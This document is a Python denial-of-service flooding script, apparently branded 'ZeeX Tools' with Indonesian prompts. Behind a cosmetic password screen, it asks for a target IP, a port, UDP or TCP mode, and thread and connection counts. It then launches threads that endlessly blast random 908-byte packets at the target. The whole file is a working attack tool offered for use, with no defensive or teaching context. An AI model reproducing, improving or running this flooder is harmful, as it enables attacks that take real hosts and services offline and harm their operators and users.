import os
import sys
import random
import socket
import threading
import requests
import socks
import time
from time import sleep

os.system("clear")
time.sleep(2)
print("LOADING")
animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

for i in range(len(animation)):
    time.sleep(1)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()
    
print("\033[91m")
time.sleep(1)
os.system('clear')
print("\033[91m")
print("""
===========================================
  _        ___     ____   ___   _   _
 | |      / _ \   / ___| |_ _| | \ | |
 | |     | | | | | |  _   | |  |  \| |
 | |___  | |_| | | |_| |  | |  | |\  |
 |_____|  \___/   \____| |___| |_| \_|
============================================
Login Security Homepage || ZeeX Tools
============================================""")
password ="ZeeX"
for i in range(3):
	usr = input("\033[94m[•] Username : \u001b[31m")
	pwd = input("\033[94m[•] Password Tools : \u001b[31m")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[94m[•] Mengecek Password !!!")
		break
	else:
		time.sleep(5)
		print("\033[94m[•] Mengecek Password !!!")
		time.sleep(5)
		print("\u001b[31m[•] Password Salah !!!")
		continue
time.sleep(5)
print("\033[94mSelamat \u001b[31m {}\033[94m, Anda Berhasil Login Menggunakan Password \u001b[31m{}".format(usr, pwd))
time.sleep(5)
os.system('clear')
print("""\033[93m
  ____   ___  ____       ___ _   _ ____   ___  
 |  _ \ / _ \/ ___|     |_ _| \ | |  _ \ / _ \ 
 | | | | | | \___ \ _____| ||  \| | | | | | | |
 | |_| | |_| |___) |_____| || |\  | |_| | |_| |
 |____/ \___/|____/     |___|_| \_|____/ \___/ 
\u001b[31m                | UDP & TCP |
""")
ip = str(input("\033[34m[•] IP TARGET\u001b[31m          ====> "))
port = int(input("\033[34m[•] PORT TARGET\u001b[31m        ====> "))
choice = str(input("\033[34m[•] METHODS? (udp/tcp)\u001b[31m ====> "))
times = int(input("\033[34m[•] CONNECTIONS\u001b[31m        ====> "))
threads = int(input("\033[34m[•] THREADS\u001b[31m            ====> "))
def udp():
  data = random._urandom(908)
  while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                for x in range(times):
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                print("\033[92m ZX DDOS ==>\u001b[31m ATTACKING TO IP\033[0m {}\u001b[31m ON PORT\033[0m {}\033[0m".format(ip, port))
        except:
                print("\033[34m × Down Dekk!!!")

def tcp():
  data = random._urandom(908)
  while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(times):
                        s.send(data)
                        s.send(data)
                        s.send(data)
        except:
                s.close()
                print("\033[92m ZX DDOS ==>\u001b[31m ATTACKING TO IP\033[0m {}\u001b[31m ON PORT\033[0m {}\033[0m".format(ip, port))

for y in range(threads):
  if choice == 'udp':
        th = threading.Thread(target = udp)
        th.start()
  elif choice == 'tcp':
        th = threading.Thread(target = tcp)
        th.start()